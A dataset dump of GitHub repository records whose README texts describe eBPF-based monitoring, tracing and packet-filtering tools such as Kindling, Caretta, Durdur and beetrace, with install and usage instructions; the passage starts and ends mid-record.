GRUB_CMDLINE_LINUX=""rd.lvm.lv=fedora_fedora/root rhgb quiet net.ifnames=0 biosdevname=0""

# then:
sudo grub2-mkconfig -o /boot/grub2/grub.cfg
```
This updates dhcp script to dynamically update systemd-resolved on per interface resolver

```bash
sudo vi /usr/sbin/dhclient-script

# change:
if [ -n ""${new_domain_name_servers}"" ]; then
    for nameserver in ${new_domain_name_servers} ; do
        echo ""nameserver ${nameserver}"" >> ""${rscf}""
    done

# to:   
if [ -n ""${new_domain_name_servers}"" ]; then
    for nameserver in ${new_domain_name_servers} ; do
        echo ""nameserver ${nameserver}"" >> ""${rscf}""
        systemd-resolve --interface ""${interface}"" --set-dns ""${nameserver}""
    done
````

## Analisys
---

                                                     DIAGRAMS

![Diagram](packet-flow.drawio.png) 



"
kindlingproject/kindling,1051,159,1051,27,Go,eBPF-based Cloud Native Monitoring Tool,2021-12-27T06:16:38Z,2025-10-10T02:55:55Z,447,"# Kindling

[![License](https://img.shields.io/badge/license-Apache2.0-blue.svg)](https://github.com/KindlingProject/kindling/blob/main/LICENSE)
[![Doc](https://img.shields.io/badge/docs-latest-green.svg)](http://kindling.harmonycloud.cn/docs/overview-and-concepts/overview/) 
[![Go Report Card](https://goreportcard.com/badge/github.com/KindlingProject/kindling/collector)](https://goreportcard.com/report/github.com/KindlingProject/kindling/collector)

Visit our [Kindling website](http://kindling.harmonycloud.cn/) for more information.

## What is Kindling

Kindling is an eBPF-based cloud native monitoring tool, which aims to help users understand the app behavior from kernel to code stack. With **trace profiling**, we hope the user can understand the application's behavior easily and find the root cause in seconds. Besides trace profiling, Kindling provides an easy way to get an overview of network flows in the Kubernetes environment, and many built-in network monitor dashboards like TCP retransmit, DNS, throughput, and TPS. Not only as a network monitor, but Kindling is also trying to analyze one detail RPC call and get the following information, which can be found in network explore in chrome. And the usage is the same as network exploration in chrome, with which users can tell which part to dig into to find the root cause of the problem in the production environment.

![img](https://cdn.nlark.com/yuque/0/2021/png/749988/1633767195234-af2913c4-75d7-447d-99bb-bd1d815883ae.png)

## What is Kindling Trace-profiling
With traces, metrics, and logs, many issues still canâ€™t be understood easily. Trace-profiling is trying to integrate the OnCPU and OffCPU events within the traces and collect the logs output during the trace execution timeframe.

OnCPU events are just like the flame graph, but the code has been collected at the thread level instead of the process level. And the trace was executed by one thread, so users can understand how the trace was executing on the CPU.

OffCPU events are the opposite of OnCPU events. As for the trace analysis, most traces spend a lifetime waiting for the locks, database query, remote process call, file reading, or file writing. All of these events cause the thread in waiting status, and they are considered as OffCPU events.

So for trace profiling, how all threads were executed is recorded and can be replayed.
- The exact thread which executed the trace span is highlighted.
- The logs printed by each thread are collected and correlated to the relative thread with its timestamp.
- The code execution flame graph is correlated to the time series where the CPU is busy.
- The network-related metrics are correlated to the time series where the network syscalls are executing.
- The file-related metrics are correlated to the time series where the file syscalls are executing.

## Architecture

From a high-level view, the agent runs as DeamonSet in Kubernetes. It collects all syscalls and some other tracepoints. We use different exporters for different distributions. 
For example, we build a Prometheus exporter to export the data which can be stored in Prometheus and displayed in Grafana Plugin. But for the trace profiling module, the UI is different, that's a standalone module. 

![image.png](/docs/imgs/architecture.png)

## Linux kernel version support

The Kindling eBPF module depends on the kernel version which is newer than 4.14. But for trace-profiling, the kernel version has to be newer than 4.17, hoping with more work, the trace-profiling can work on older kernel versions. As an eBPF constraint, the eBPF module can't work for older kernel versions. But for the users who want to try the functionality with the old kernel, we use the kernel module from Sysdig open-source project with enhancement and verification. Basically, the idea is to use a kernel module for tracking the kernel tracepoints. Thanks to Sysdig open-source project, it provides a tracepoint instrument framework for older kernel versions.

For now, the kernel module works as expected as the eBPF module during our test except for trace-profiling, but it is recommended to use the eBPF module in the production environment as it is safer than the kernel module. In order to help the older kernel version user experience the eBPF magic, we also support the kernel model. And you are welcome to report issues with the kernel module. For functionality, the kernel module and eBPF module capture the same data and behave exactly the same. 

## Why do we build Kindling?

When we talk about observability, we already have plenty of tools to use, like Skywalking for tracing, ELK for logging, and Prometheus for metrics. Why do we need to build an eBPF-based monitoring tool?

The majority issue for user adoption of k8s is the complexity. For the applications on Kubernetes, we don't know the network flows between the services until we can instrument the apps. We can't tell which part to blame when there is a product issue arise. Do we configure Kubernetes correctly? Are there any bugs in the virtual network like Calico or Flannel that caused this problem? Does the application code cause this issue?

We are a company based in Hangzhou, China, and used to provide Kubernetes distribution for our customers. Our customers used to have those questions, and we don't have proper solutions to answer those questions.

APM(Application Performance Monitoring) is good for those applications in Java which can be instrumented automatically, while for the Go programs, the code has to be rewritten for instrumenting. And even if we adopt the APM solution, we still can't tell whether an issue is caused by network problems, and many issues canâ€™t be pinpoint the root cause easily.

We found it may be helpful that we triage the issue first by checking the issue from the network view to identify issues roughly like ""oh, it's a network problem, the code works fine, and we should dig into the configuration of calico"" or ""the infrastructure works fine, so the app code should be blamed, let's dig into the logs or the APM dashboard for further information"".

After we triage the issue, we need to pinpoint the root cause of the issue. That's why we need the trace-profiling module.

### Why eBPF?

The libpcap way of analyzing the flows in the Kubernetes environment is too expensive for the CPU and network. The eBPF way of data capture cost much less than libpcap. eBPF is the most popular technology to track the Linux kernel where the virtual network, built by veth-pair and iptables, works. So eBPF is a proper technique to be used for tracking how the kernel responds to application requests.

## Core Features

With the trace-profiling module, we can understand how ElasticSearch works easily. The following image shows how ElasticSearch is executing the `bulk insert` operation.

![trace-profiling](/docs/imgs/traceprofiling.png)

The next image shows a dependency map in Kubernetes. 

![img](https://cdn.nlark.com/yuque/0/2022/png/749988/1642572876088-c26396ac-e7bb-44e7-ae0c-cc96f3344cd8.png)

Kindling can be easily integrated with Prometheus, and we uses PromQL to query the data in the frontend, so it should be adopted easily. But due to the cardinality constraint of Prometheus, we group the detailed data into buckets which throw away the detailed information.

## Get started

You can deploy Kindling easily, check out the [Installation Guide](http://kindling.harmonycloud.cn/docs/installation/kindling-agent/requirements/) for details.

## Documentation

The Kindling documentation is available on our [Kindling website](http://kindling.harmonycloud.cn/docs/overview-and-concepts/overview/)

## Contributing 

Contributions are welcome, you can contribute in many ways: report issues, help us reproduce issues, fix bugs, add features, give us advice on GitHub discussion, and so on. If you are interested in joining us to unveil the eBPF in the Kubernetes area, you can start by reading the [Contributing Guide](https://github.com/KindlingProject/kindling/blob/main/CONTRIBUTING.md).

## Contact

If you have questions or ideas, please feel free to reach out to us in the following ways:

- Check out the [discussions](https://github.com/KindlingProject/kindling/discussions)
- Join the Kindling [Slack channel](https://join.slack.com/t/kindling-world/shared_invite/zt-1rmki34l0-JiFpWFR7YhqlXG~mSQQAtg)
- Join the WeChat Group (in Chinese)

![img](/docs/imgs/wechat-code.png)

## License

Kindling is distributed under [Apache License, Version2.0](https://github.com/KindlingProject/kindling/blob/main/LICENSE).

"
IETF-Hackathon/ietf115-project-presentations,4,1,4,0,HTML,Project results presentations at end of Hackathon,2022-08-05T21:29:26Z,2023-03-21T18:16:03Z,74,"# IETF 115 project presentations

This repo is for IETF Hackathon participants to upload project presentations. For convenience, presentation templates are provided in [PPTX](hackathon-presentation-template.pptx) and [HTML](hackathon-presentation-template.html) formats, the latter of which can be viewed [online](https://ietf-hackathon.github.io/ietf115-project-presentations/hackathon-presentation-template.html) if it is put in the [main branch](https://github.com/IETF-Hackathon/ietf115-project-presentations/). For the HTML format, a corresponding [pdf](https://github.com/IETF-Hackathon/ietf115-project-presentations/blob/pdfs-from-html/hackathon-presentation-template.pdf) is automatically generated from the HTML file by a [GitHub action](.github/workflows/main.yml) and put in the [pdfs-from-html branch](https://github.com/IETF-Hackathon/ietf115-project-presentations/tree/pdfs-from-html).

The use of these templates is optional. If you do use one of these templates, please rename the file such that it clearly identifies your project, e.g., includes the name or acronym of your project. The contents of this repo will be used as the source for all project presentations at the end of the Hackathon and remain as a reference after the Hackathon. Presenters are encouraged to run their own presentations using the screen sharing functionality in Meetecho. Alternatively, the Hackathon Chairs can share your presentation and advance slides for you.  **For portability, please upload your presentation in PDF or HTML format.**

**You MUST be a [member](https://github.com/orgs/IETF-Hackathon/people) of the [IETF-Hackathon](https://github.com/IETF-Hackathon) GitHub org** to add or update a presentation. 

To be added as a member, please be sure to:

* include the [name](https://docs.github.com/en/github/setting-up-and-managing-your-github-profile/personalizing-your-profile#changing-your-profile-name) by which you are known as part of your in your GitHub profile 
* enable two-factor authentication [(2FA)](https://docs.github.com/en/github/authenticating-to-github/securing-your-account-with-two-factor-authentication-2fa)
* send your GitHub username to [hackathon-chairs@ietf.org](mailto:hackathon-chairs@ietf.org)

**DO NOT WAIT** until just before project presentations start or your request may be lost in the chaos.

For more info on the Hackathon, including the complete and most up to date agenda, please see the [Hackathon Wiki](https://wiki.ietf.org/en/meeting/115/hackathon)."
intel/processwatch,144,13,144,0,C,,2022-09-26T20:45:12Z,2025-09-04T14:39:16Z,71,"Process Watch
=============

This is an example of Process Watch running on an IntelÂ® NUC running the [LULESH](https://github.com/LLNL/LULESH) workload. Note the presence of SSE, AVX, and AVX2 instructions.
![image](https://github.com/user-attachments/assets/647b199d-a4f2-4d34-b5e7-3c0f41249bd3)

Overview
--------

Process Watch displays per-process instruction mix in real-time, organizing these
instructions into categories. It offers a simple, tabular output in addition to
CSV.

Examples
--------

To display the default categories in a table every 2 seconds:
```
$ ./processwatch
```

To show mnemonics instead of instruction categories:
```
$ ./processwatch -m
```

To list available categories/mnemonics/extensions, add `-l`:
```
$ ./processwatch -l
```

To show specific categories/mnemonics/extensions, specify them with multiple `-f` arguments:
```
$ ./processwatch -f PUSH -f POP
```

To show *all* categories/mnemonics/extensions, to be parsed by some script:
```
$ ./processwatch -a
```

To show all available switches:
```
$ ./processwatch -h
```

Runtime Requirements
--------------------

For the binary releases, the only requirement is that you have BTF metadata in
your kernel.  If the file `/sys/kernel/btf/vmlinux` exists on your system, then
you have it. If not, then your kernel does not have BTF metadata.

If your kernel does not have this feature, you can enable it by installing or
compiling a kernel with the `CONFIG_DEBUG_INFO_BTF` configuration option
enabled.  Keep in mind that if you're compiling the kernel yourself, you need to
install the `pahole` commandline utility to compile a kernel with this option
enabled.

There are two ways to compile Process Watch:
1. `./build.sh`. This executable should work in kernel version `5.8.0` and newer.
2. `./build.sh --legacy`. This executable is for kernels before `5.8.0`.

Building
--------

First, clone the repository:
```
git clone --recursive https://github.com/intel/processwatch.git
```

If you've already cloned without `--recursive`, go into the repository directory and issue:
```
git submodule init
git submodule update --init --recursive
```

If you want to compile the tool, there are a few common packages that you'll need to install
on your system:
1. CMake
2. Clang
3. LLVM (e.g. `llvm-strip`)
5. NCURSES
6. POSIX Threads
7. `libelf`

You can install these on Ubuntu 20.04, 21.10, or 22.04 by issuing the following:
```
sudo apt-get update
sudo apt-get install libelf-dev cmake clang llvm llvm-dev
```

Ubuntu 18.04 requires a bit more work; the default LLVM version is too old:
```
sudo apt-get update
sudo apt-get install libelf-dev cmake clang-10 llvm-10 llvm-10-dev
```
Then edit `build.sh` and append `-10` to the values of `CLANG`, `CLANGXX`, and `LLVM_STRIP`.

On CentOS 8.4, CentOS 8 Stream, and CentOS 9 Stream:
```
sudo yum update
sudo yum install cmake bpftool clang llvm-toolset ncurses-devel
```

On Amazon Linux 2, you can do:
```
sudo yum update
sudo yum install bpftool zlib-devel zlib-static \
  elfutils-libelf-devel clang cmake3 llvm \
  glibc-static
```

Please keep in mind that if you're running a custom kernel, you'll need to compile
and install `bpftool` in the  `tools/bpf/bpftool` directory of your kernel's source tree.

Now, check your kernel version:
```
uname -a
```

If you have a kernel older than 5.8.0, compile with:
```
./build.sh --legacy
```

If your kernel is 5.8.0 or newer, do:
```
./build.sh
```
   
Interactive Mode
----------------

This is the default mode, so no command-line arguments are necessary to enable it.
Kill it with CTRL-C or send it SIGTERM. You can also do `-n <num>` to have it stop
after a number of intervals.

CSV Mode
----------

To enable this mode, pass `--csv` or `-c` on the command-line. Output will go to
`stdout`. Send `SIGTERM` to kill it.

Known Build Issues
------------------

# Ubuntu `bpftool` Issue

_This happens particularly on Ubuntu 20.04, which includes a version of `bpftool` that
is too old to read the kernel's BTF information._

Sometimes when you install `linux-tools-common` or `linux-tools-generic`, you get
a version of `bpftool` that is not associated with the kernel that you're currently running.
This happens when there is a kernel package update, but you're still running an older kernel.
Similarly, on Ubuntu 20.04, you may get a `bpftool` version that fails to read the BTF
information (which is stored in `/sys/kernel/btf/vmlinux`).

Resolving this issue is simple, but depends on your situation.
1. If you're on Ubuntu 20.04, install `linux-tools-*` for a _newer_ kernel. I chose the
   `linux-tools-5.8.0-63-generic` package.
2. If you're running a newer Ubuntu version, you might just want to install `linux-tools-$(uname -r)`
   to install the Linux tools for your currently-running kernel.
3. A longer-term solution is to simply upgrade your system (`sudo apt-get update && sudo apt-get upgrade`),
   install the `linux-tools-generic` package, and then reboot the machine into the updated kernel.

If you need to tell the build system to use a specific version of `bpftool`, simply edit the `BPFTOOL` variable
in `build.sh`. For example, if you're on Ubuntu 20.04 and have installed ``linux-tools-5.8.0-63-generic`,
you might want to edit that variable to become something like:
```
export BPFTOOL=""/usr/lib/linux-tools/5.8.0-63-generic/bpftool""
```
"
ShubhamPalriwala/NetWorth,27,0,27,0,Python,eBPF based Network Monitoring using Prometheus and Grafana,2022-11-15T06:02:07Z,2025-04-22T16:23:23Z,27,"# NetWorth
![NetWorth-Dashboard](./assets/grafana-dashboard.png)
<p align=""center"">
Monitor your host's ingress data packets leveraging the power of eBPF and XDP. Visualise it in Grafana through Prometheus.
</p>
 

### Features
- Observe the locations of the Servers you are querying your packets from through the World Map
- Get the number of bytes you are receving on your Network Interface Card
- Get the number and types of Layer 4 protocols your host is dealing wtih
- Set an alert on the % of the CPU used by NetWorth

### Run Locally
```sh
git clone https://github.com/ShubhamPalriwala/networth.git
cd networth/
docker compose up
```

<details>
<summary>Do you want to build it yourself without docker? Click me!</summary>
<br>

Requirements
- Python3
- pip
- Grafana
- Prometheus

1. Clone and get into the repository

```
git clone https://github.com/ShubhamPalriwala/NetWorth
cd Networth/
```

2. Install the required Python dependencies:

```
pip install -r requirements.txt
```

3. Install dev tools and Linux Kernel Headers through your package manager (example apt):

```
sudo pacman -S bcc-tools linux-headers
```

4. Start the Grafana service: 
```
sudo systemctl start grafana.service
```

5. Start the prometheus server:
```
prometheus --config.file=prometheus.yml
```

6. Finally start the eBPF program:
```
sudo python3 caller.py
```

7. Now head over to Grafana and import the Dashboard by uploading the `grafana.json` file.

*Congrats! You should now be able to see your NetWorth!*

</details>

## Artifacts available:
1. Python client sending data at http://localhost:8000/metrics 
2. Prometheus Scraping logs at http://localhost:9090
3. Grafana Dashboard at http://localhost:3000/d/PyIm36vVk/networth?orgId=1/
4. Docker Image for NetWorth App available at: https://hub.docker.com/repository/docker/laalshaitaan/networth

#### Note
If you plan to use this for more than just fun, I would recommend you get an API key from https://ipinfo.io/ for unobstructed monitoring and add it to the `sample.env` and then rename it to `.env`


## License

Copyright 2022 Shubham Palriwala

Licensed under [MIT License](./LICENSE)

<p align=""center"">Made to learn and explore :honeybee: eBPF</p>"
boratanrikulu/durdur,85,1,85,2,Go,"Lightweight packet filtering for Linux: 'durdur' is a high-performance, eBPF-based simple firewall tool that drops packets by IP or DNS domain. Perfect for on-demand network control.",2022-10-04T14:43:06Z,2025-09-22T12:03:06Z,73,"# Durdur ðŸ

[![Build Status](https://github.com/boratanrikulu/durdur/actions/workflows/test.yml/badge.svg)](https://github.com/boratanrikulu/durdur/actions?query=branch%3Amain)
[![Go Report Card](https://goreportcard.com/badge/github.com/boratanrikulu/durdur)](https://goreportcard.com/report/github.com/boratanrikulu/durdur)
[![codecov](https://codecov.io/gh/boratanrikulu/durdur/branch/main/graph/badge.svg?token=3ACWW3Y2A0)](https://codecov.io/gh/boratanrikulu/durdur)
[![LICENSE](https://img.shields.io/github/license/boratanrikulu/durdur.svg)](https://github.com/boratanrikulu/durdur/blob/main/LICENSE)

[Durdur](https://www.youtube.com/watch?v=sF0QweCoaMo) is a CLI tool for Linux implementing L3/L4 packet dropping with eBPF/Go.

![example](doc/example.png)

## How to use

Durdur is easy to use with these commands: **`attach`**, **`detach`**, **`drop`**, **`undrop`**, and **`list`**.  
All commands should be run with **root privileges**.

### Attach

**`attach`** installs Durdur on the system for a specific interface.

```sh
durdur attach --interface eth0
```

### Detach

**`detach`** uninstalls Durdur from the system.

```sh
durdur detach
```

### Drop and Undrop

**`drop`** and **`undrop`** checks all (ingress) L3 and L4 packets in the system and either block or allow them.  
Both commands support the following flags:  

- **`src`** for the source address value of an IPv4 packet.
- **`dns`** for the domain value of a DNS packet.

Example usage for **`drop`**;

```sh
durdur drop --src ""192.0.1.1""
```

```sh
durdur drop --dns ""example.com""
```

Example usage for **`undrop`**;

```sh
durdur undrop --src ""192.0.1.1""
```

```sh
durdur undrop --dns ""example.com""
```

### List

`list` writes all entires of the maps to the stdout. It has 3 subcommands; `src`, `dns`, and `all`.

Example usage for **`list`**;
```sh
durdur list src
```  
```sh
durdur list dns
```
```sh
durdur list all
```

## How to install

### From source;

Build and use `build/durdur` binary.

```
make build
```

### From Docker image;

Build the image.  
```sh
make build-docker
```

Run the container with **privileges**.  

Example usage;  

```sh
docker run --rm -i -t --net=""host"" --privileged -v /sys/fs/bpf:/sys/fs/bpf durdur -- attach -i eth0
```

```sh
docker run --rm -i -t --net=""host"" --privileged -v /sys/fs/bpf:/sys/fs/bpf durdur -- drop --dns ""example""
```

PS: You don't need to use `--net=""host""` if you don't want to access host's interfaces.

## TODO

- [ ] Egress support.
- [ ] Wildcard support to DNS.
- [ ] IPv6 support.
- [ ] Multiple interfaces support.
- [ ] Port support.

## Copyright

[GPL-3.0 license](https://github.com/boratanrikulu/durdur/blob/main/LICENSE),  
Copyright 2022-2024 Bora Tanrikulu <[me@bora.sh](mailto:me@bora.sh)>
"
groundcover-com/caretta,1947,75,1947,13,Go,"Instant K8s service dependency map, right to your Grafana.",2022-11-21T17:33:52Z,2025-10-05T02:57:50Z,151,"<div align=""center"">
  <h1>Caretta</h1>
  <p align=""center"">
    <img src=""images/logo.svg"" width=""25%"" alt=""caretta"" title=""caretta"" />
   <br><br>
   <a href=""https://www.producthunt.com/posts/caretta?utm_source=badge-top-post-topic-badge&utm_medium=badge&utm_souce=badge-caretta"" target=""_blank""><img src=""https://api.producthunt.com/widgets/embed-image/v1/top-post-topic-badge.svg?post_id=373791&theme=neutral&period=weekly&topic_id=267"" alt=""Caretta - Instant&#0032;K8s&#0032;service&#0032;dependency&#0032;map&#0044;&#0032;right&#0032;to&#0032;your&#0032;Grafana | Product Hunt"" width=""25%""/></a>
  </p>
    <h2>Instant K8s service dependency map, right to your Grafana.</h2>
    <h4> made by <a href=""https://www.groundcover.com"">groundcover</h4>
  <p>

[![slack](https://img.shields.io/badge/slack-groundcover-yellowgreen.svg?logo=slack)](http://www.groundcover.com/join-slack)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
<br>

</div>

<p align=""center"">
    <img src=""images/caretta.gif"" width=""90%"" alt=""caretta-screenshot"" title=""caretta-screenshot"">
</p>

## What is Caretta?

Caretta is a lightweight, standalone tool that instantly creates a visual network map of the services running in your cluster.

Carreta leverages eBPF to efficiently map all service network interactions in a K8s  cluster, and Grafana to query and visualize the collected data.

Carreta is built to be efficient, with a minimal footprint on the system, and does not require any modifications of the cluster.

Caretta demonstrates the power of using eBPF for observability solutions, which is our vision at <a href=""https://groundcover.com"">groundcover</a>. If you're interested in understanding how Caretta is built, head over to our <a href=""https://www.groundcover.com/blog/caretta"">Caretta blog post!</a>

## Installing Caretta :zap:
As simple as installing a helm chart. It is recommended to install Caretta in a new, unique namespace.
```bash
helm repo add groundcover https://helm.groundcover.com/
```
```bash
helm repo update
```
```bash
helm install caretta --namespace caretta --create-namespace groundcover/caretta
```

### Configuration
You can configure Caretta using helm values.
Useful values:
* **tolerations** can be specified to make sure Caretta's eBPF-agent will run on all cluster in your nodes. *default value will tolerate common control-plane node annotations*
* **victoria-metrics-single.server.persistentVolume.enabled** can be set to *true* if you wish to save Caretta's metrics to a persistent volume *default: false*
* **pollIntervalSeconds** can be modified to specify the polling and publishing interval of new metrics from the kernel. *default: 5*
* The built-in Victoria Metrics and Grafana instances can be disabled by changing the values **victoria-metrics-single.enabled** or **grafana.enabled** to false, accordingly. _default: true_
* Caretta resolves Kubernetes entities to their owners by default. For example, a pod 'pod1' and another pod 'pod2' both belonging to a deployment 'deployment1' will be resolved to 'deployment1'. This can be disabled by setting **traverseUpHierarchy** to false. _default: true_


Example yaml for overriding these values:
```yaml
pollIntervalSeconds: 15  # set metrics polling interval
traverseUpHierarchy: false  # disable resolving kubernetes entities to their owners

tolerations:             # set any desired tolerations
  - key: node-role.kubernetes.io/control-plane
    operator: Exists
    effect: NoSchedule

 victoria-metrics-single:
  server:
    persistentVolume:
       enabled: true   # set to true to use persistent volume
```
This can also be done using the --set flag on the `helm install` command.

### Uninstallation
To uninstall, delete the helm release:
```bash
helm delete caretta --namespace caretta
```
Note that if persistent storage was enabled in the installation, it may not be deleted automatically by this command.

## Requirements
* Linux kernel version >= 4.16
* <a href=""https://nakryiko.com/posts/bpf-portability-and-co-re/"">CO-RE</a> support. Supported linux distributions can be found <a href=""https://github.com/libbpf/libbpf#bpf-co-re-compile-once--run-everywhere"">here</a>. Specifically, Docker for Mac uses a distribution which is not currently supported.



## Working with Caretta :turtle:
Caretta's helm chart ships an instance of Grafana with a predefined dashboard using data published by Caretta. This dashboard contains some examples to demonstrate the usage of Caretta's metrics.

### Using the provided Grafana instance
To access Grafana, port-forward port `3000` from the Grafana pod in Caretta's namespace.

Using *kubectl*, it should look something like this:

```bash
kubectl port-forward --namespace caretta <grafana-pod-name> 3000:3000
```

> **_NOTE:_**  Anonymous mode is enabled, making the default dashboard accessible with no login needed.
>              To edit the default dashboard or create your own dashboard, use the default administrator's credentials user:`admin` ; password:`caretta`.

### Scraping Caretta's metrics

Caretta uses [Victoria Metrics](https://victoriametrics.com/) to collect and publish its metrics, and the outcome can be consumed by **any Prometheus-compatible dashboard**.

Caretta's main metric is `caretta_links_observed` (Gauge). It uses the following labels to represent a specific connection (network socket) going through the cluster:
* `client_name` - either a name of a kubernetes entity, if resolved, an external domain, if resolved, or an IP address.
* `client_namespace` - either the namespace of the kubernetes entity, or ""node"", or ""external"".
* `client_kind` - either the kind of the kubernetes entity, or ""node"", or ""external"".
* `server_name` - either a name of a kubernetes entity, if resolved, an external domain, if resolved, or an IP address.
* `server_namespace` - either the namespace of the kubernetes entity, or ""node"", or ""external"".
* `server_kind` - either the kind of the kubernetes entity, or ""node"", or ""external"".
* `server_port` - the port used by the server.
* `role` - either 1 (client) or 2 (server).

Along those labels, Caretta uses other labels for Grafana's Node Graph panel.

#### Example metric data
This example shows a connection between a client named `checkoutservice`, controlled by a deployment, to a service named `productioncatalogservice` on port 3550, from the perspective of the client. Total bytes sent by the client in this connection is 2537 bytes.
```bash
caretta_links_observed{client_id=""1074587981"",client_kind=""Deployment"",client_name=""checkoutservice"",client_namespace=""demo-ng"",link_id=""198768460"",role=""1"",server_id=""1112713827"",server_kind=""Service"",server_name=""productcatalogservice"",server_namespace=""demo-ng"",server_port=""3550""} 2537
```

#### Example queries  :star:
```bash
increase ((sum (server_port) (caretta_links_observed{client_name=""some-client"", server_name=""some-server}))[15m])
```
will output the throughput observed between some-client and some-server in the last 15 minutes, aggregated by port.

```bash
sum by (server_name) (rate(caretta_links_observed{client_name=""some-client""}))
```
will output the rate of traffic from some-client to servers it communicates with, aggregated by the server's name.

```bash
sort_desc(increase((sum by (client_name)(caretta_links_observed{server_namespace=""external""}))[5m]))
```
will output communication to external servers by client's name, sorted descending.

## Need help:grey_question:
Feel free to reach us on our <a href=""http://www.groundcover.com/join-slack"">slack channel</a>, or create an issue in this repository.

## Contribution
Feel free to add your contribution to the project.

* Open an issue for missing features, or bugs
* Create a pull request for adding code to the project
"
keisku/execve-printer,4,0,4,0,Go,The eBPF program will execute and print a message when the `execve()` system call is invoked,2023-01-06T06:39:09Z,2025-01-20T21:43:00Z,12,"# execve-printer

The program is attached to the `sys_enter_execve` tracepoint, which is a special point in the kernel's execution where the `execve()` system call is entered.
When the `execve()` system call is invoked, this eBPF program will execute and print a message to the kernel log using the `bpf_printk()` function. 
This program stops when you hit Ctrl+c.

## Usage

```bash
make build
sudo ./execve-printer 
           <...>-1074677 [001] d...1 506309.848867: bpf_trace_printk: invoke sys_enter_execve

           <...>-1074678 [001] d...1 506309.853706: bpf_trace_printk: invoke sys_enter_execve

            node-1074680 [000] d...1 506310.736524: bpf_trace_printk: invoke sys_enter_execve

           <...>-1074681 [001] d...1 506310.737897: bpf_trace_printk: invoke sys_enter_execve

            node-1074682 [000] d...1 506310.740691: bpf_trace_printk: invoke sys_enter_execve

              sh-1074683 [000] d...1 506310.743042: bpf_trace_printk: invoke sys_enter_execve

            node-1074684 [000] d...1 506310.755259: bpf_trace_printk: invoke sys_enter_execve

           <...>-1074685 [001] d...1 506310.756726: bpf_trace_printk: invoke sys_enter_execve

     cpuUsage.sh-1074686 [000] d...1 506310.758702: bpf_trace_printk: invoke sys_enter_execve
```

## Implementation

1. See `/sys/kernel/debug/tracing/events` to find available tracepoints.
2. Write the C program which is attached to the `sys_enter_execve` tracepoint and prints a message when the `execve()` is invoked.
3. Run `make generate` to compiles a C source code into eBPF bytecode and then emits a Go file containing the eBPF.
4. Scan `/sys/kernel/debug/tracing/trace_pipe` to print kernel logs using `bpf_printk()`.
"
trailofbits/ebpf-verifier,34,3,34,5,C,Harness for the Linux kernel eBPF verifier,2022-06-08T17:36:12Z,2025-10-03T20:00:51Z,63,"# Overview

The eBPF Verifier Harness project seeks to isolate the eBPF verifier from the
Linux kernel in order to allow efficient checks that an eBPF program will run
on various kernel versions and configurations. It will also allow for detecting
discrepencies in the eBPF verifier between different kernel versions.

## Architecture:

1. linux/src: git submodule of linux src
2. libbpf/src: git submodule of libbpf mirror src
3. samples: sample bpf programs
4. src: harness runtime files
5. scripts: miscellaneous scripts used to generate function declarations and such

# Build System:

This project uses cmake to an extent, but also heavily relies on Makefiles.
In the future the build system should definitely be streamlined by someone that
understands cmake.

Here are some of the more useful build commands, but they are not comprehensive.

Use the following cmake command to change the linux source version:
```cmake -S . -B build -DCMAKE_BUILD_TYPE=RelWithDebInfo -DBPFVERIFIER_LINUX_VERSION=""v5.2"" ```
```cmake --build build --target linux_submodule_updater```

After updating kernel source version make

To build kernel object:
```cmake --build build --target kernel```

To build libbpf object:
```cmake --build build --target libbpf```

To build harness for a sample/hello.bpf.c:
```make hello```
"
furkanonder/beetrace,259,4,259,0,Python,Trace your python process line by line with eBPF!,2023-01-14T00:27:14Z,2025-08-18T04:35:23Z,4,"<div align=""center"">
  <img src=""/assets/logo/beetrace.png"" width=500px />
  <h2>Trace your python process line by line with low overhead!</h2>
</div>

_beetrace_ allows you to trace a Python process line by line or the functions' entries
and returns. It uses USDT(User Statically-Defined Tracing) probes with
[bpftrace](https://github.com/iovisor/bpftrace/).

## Dependencies

- This package is only available for Linux and requires bpftrace. You can look at the
  bpftrace installation
  [here](https://github.com/iovisor/bpftrace/blob/master/INSTALL.md).

- CPython must be
  [configured with the --with-dtrace option](https://docs.python.org/3/using/configure.html#cmdoption-with-dtrace).

## Installation

```bash
pip install beetrace
```

## Usage & Example

To trace the Python process, use the -p parameter to pass the pid value.

```bash
beetrace -p {pid of process}
```

Let's take a look at the quick example.

---

```bash
$ cat -n example.py
1 import os
2 from time import sleep
3
4
5 def c():
6     x = 1
7
8 def b():
9     y = 2
10    c()
11
12
13 def a():
14     z = 1
15     b()
16
17
18 while True:
19     print(f""PID of program: {os.getpid()}"")
20     sleep(1)
21     print(""Sleep 1 second"")
22     a()
```

Output:

```bash
PID of program: 17988
Sleep 1 second
PID of program: 17988
Sleep 1 second
PID of program: 17988
Sleep 1 second
PID of program: 17988
...
...
...
```

```bash
$ beetrace -p 17988
___  ____ ____ ___ ____ ____ ____ ____
|__] |___ |___  |  |__/ |__| |    |___
|__] |___ |___  |  |  \ |  | |___ |___

PID: 17988 | Tracing from: python3 example.py

Press Control-C to quit.

Path                                   File:Line                                          Function
/tmp                                   example.py:18                                      <module>
/tmp                                   example.py:19                                      <module>
/tmp                                   example.py:20                                      <module>
/tmp                                   example.py:21                                      <module>
/tmp                                   example.py:22                                      <module>
/tmp                                   example.py:14                                      a
/tmp                                   example.py:15                                      a
/tmp                                   example.py:9                                       b
/tmp                                   example.py:10                                      b
/tmp                                   example.py:6                                       c
/tmp                                   example.py:18                                      <module>
/tmp                                   example.py:19                                      <module>
/tmp                                   example.py:20                                      <module>
/tmp                                   example.py:21                                      <module>
/tmp                                   example.py:22                                      <module>
/tmp                                   example.py:14                                      a
/tmp                                   example.py:15                                      a
/tmp                                   example.py:9                                       b
/tmp                                   example.py:10                                      b
/tmp                                   example.py:6                                       c
/tmp                                   example.py:18                                      <module>
/tmp                                   example.py:19                                      <module>
/tmp                                   example.py:20                                      <module>
...                                    ...                                                ...
...                                    ...                                                ...
...                                    ...                                                ...
```


https://user-images.githubusercontent.com/24194934/212464397-0bf66a4a-4114-4d5f-b500-b7a7f7ca0eca.mp4

"
SeeFlowerX/stackplz,1239,228,1239,20,C,åŸºäºŽeBPFçš„å †æ ˆè¿½è¸ªå·¥å…·,2022-11-09T05:49:39Z,2025-10-09T02:19:07Z,467,"# stackplz

[wbstack/watch breakpoint stack/stackplz plus](https://blog.seeflower.dev/archives/339/)

stackplzæ˜¯ä¸€æ¬¾åŸºäºŽeBPFçš„å †æ ˆè¿½è¸ªå·¥å…·ï¼Œç›®å‰ä»…é€‚ç”¨äºŽAndroidå¹³å°

ç‰¹æ€§ï¼š

